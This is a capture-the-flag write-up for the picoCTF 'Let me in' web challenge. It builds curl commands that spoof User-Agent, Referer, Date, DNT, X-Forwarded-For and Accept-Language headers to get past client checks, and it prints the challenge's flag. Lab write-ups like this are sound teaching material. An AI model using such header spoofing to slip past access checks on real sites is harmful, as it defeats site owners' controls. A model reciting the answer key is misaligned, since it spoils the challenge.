@@ -1,0 +1,90 @@
+Author: madStacks
+
+Description
+Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:38322/"
+
+
+
+Same thing editing http headers via curl. 
+
+We follow the trail of cookies to get to the right path
+
+1. a simple curl gives us "Only people who use the official PicoBrowser are allowed on this site!
+
+         so we know we have to send the picobrowser user agent 
+
+         this curl does that: curl -v -u http://mercury.picoctf.net:38322/ -H "User-Agent: picobrowser" http://mercury.picoctf.net:38322/
+
+2. "I don&#39;t trust users visiting from another site." 
+
+     so we know we have to edit the referrer header 
+
+
+curl -v \
+  --referer "http://mercury.picoctf.net:38322/" \
+  -H "User-Agent: picobrowser" \
+  http://mercury.picoctf.net:38322/
+
+
+3. Sorry, this site only worked in 2018. 
+
+So we know to add a date header . we can do that with this command 
+
+curl -v \
+  --referer "http://mercury.picoctf.net:38322/" \
+  -H "User-Agent: picobrowser" \
+  -H "Date: Sun, 01 Jan 2018 00:00:00 GMT" \
+  http://mercury.picoctf.net:38322/
+
+
+4. I don&#39;t trust users who can be tracked.
+
+So we know to add a not tracking header cookie we do that with the DNT header in this command 
+
+curl -v \
+  --referer "http://mercury.picoctf.net:38322/" \
+  -H "User-Agent: picobrowser" \
+  -H "Date: Sun, 01 Jan 2018 00:00:00 GMT" \
+  -H "DNT: 1" \
+  http://mercury.picoctf.net:38322/
+
+
+5. his website is only for people from Sweden.
+
+So we know to add a location header 
+
+
+curl -v \
+  --referer "http://mercury.picoctf.net:38322/" \
+  -H "User-Agent: picobrowser" \
+  -H "Date: Sun, 01 Jan 2018 00:00:00 GMT" \
+  -H "DNT: 1" \
+  -H "X-Forwarded-For: 95.199.120.10" \
+  http://mercury.picoctf.net:38322/
+
+
+  6. You&#39;re in Sweden but you don&#39;t speak Swedish?
+
+  So we know to add the language header we do so with this curl command and tehh Accept-Language header we found after 10 mins of googling 
+
+   curl -v \
+  --referer "http://mercury.picoctf.net:38322/" \
+  -H "User-Agent: picobrowser" \
+  -H "Date: Sun, 01 Jan 2018 00:00:00 GMT" \
+  -H "DNT: 1" \
+  -H "X-Forwarded-For: 95.199.120.10" \
+  -H "Accept-Language: sv-SE,sv;q=0.9,en;q=0.8" \
+  http://mercury.picoctf.net:38322/
+
+
+
+
+And we FINALLY get the flag picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_b22d773c}<
+
+
+
+
+
+
+
+     "Those gosh darn Swedes that speak Swedish from 2018 using the PicoBrowser that were previously on this site never want to be tracked."
